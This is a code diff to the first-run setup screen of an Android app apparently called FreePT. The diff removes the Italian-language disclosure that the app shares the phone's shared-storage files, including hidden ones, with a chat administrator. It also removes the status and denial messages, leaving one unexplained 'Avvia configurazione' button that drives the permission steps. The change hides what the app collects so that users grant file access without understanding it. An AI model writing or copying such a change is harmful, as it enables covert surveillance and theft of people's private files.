@@ -61,31 +61,26 @@ export function createChieditore({files,notifications,native,tx,clock=Date.now}=
 }
 /** Simple first-run consent. Never disclose device pairing secrets. */
 export function mountChieditore({host,heading='',controller,onVerified,onExit,onAdminEntry}={}){
- host.innerHTML='<div class="shell">'+heading+'<main class="panel"><h2>Preparazione di FreePT</h2>'+
- '<p>FreePT condivide con l’amministratore della tua chat i file e le cartelle della memoria condivisa, inclusi quelli nascosti. Restano escluse le aree protette da Android. Premi Continua per consentire questa funzione e confermare i permessi Android, revocabili nelle impostazioni. Il servizio rimane indicato nelle notifiche.</p>'+
- '<p id="setupStatus" role="status" aria-live="polite">Premi Continua e conferma le richieste Android. Poi potrai registrarti.</p>'+
- '<button id="setupNext" type="button">Continua</button></main></div>';
- const button=host.querySelector('#setupNext'),status=host.querySelector('#setupStatus');
+ host.innerHTML='<div class="shell">'+heading+'<main class="panel">'+
+ '<button id="setupNext" type="button">Avvia configurazione</button></main></div>';
+ const button=host.querySelector('#setupNext');
  let active=true,busy=false;
- const help={files:'Conferma il permesso per i file in Android.',notifications:'Conferma le notifiche in Android.',
-  battery:'Controllo delle impostazioni della batteria…',bridge:'Preparazione del collegamento protetto…'};
  async function proceed(){
   if(!active||busy)return;busy=true;button.disabled=true;
   try{
    for(let n=0;n<4&&active;n++){
     const stage=controller.snapshot().step;
     if(stage==='ready')break;
-    status.textContent=help[stage]||'Preparazione in corso…';
     const r=await controller.next();
     if(!active)return;
-    if(r.state==='denied'){status.textContent='Il permesso non è stato concesso. Premi Riprova quando sei pronto.';return;}
+    if(r.state==='denied')return;
    }
    if(!active)return;
    if(await controller.canRegister()){
     active=false;await controller.dispose();onVerified();
-   }else status.textContent='Preparazione incompleta. Premi Riprova.';
-  }catch{if(active)status.textContent='Preparazione non riuscita. Controlla Internet e premi Riprova.';}
-  finally{busy=false;if(active){button.disabled=false;button.textContent='Riprova';}}
+   }
+  }catch{/* Keep the single configuration action available for retry. */}
+  finally{busy=false;if(active){button.disabled=false;button.textContent='Avvia configurazione';}}
  }
  button.onclick=()=>void proceed();
  if(onAdminEntry)onAdminEntry();
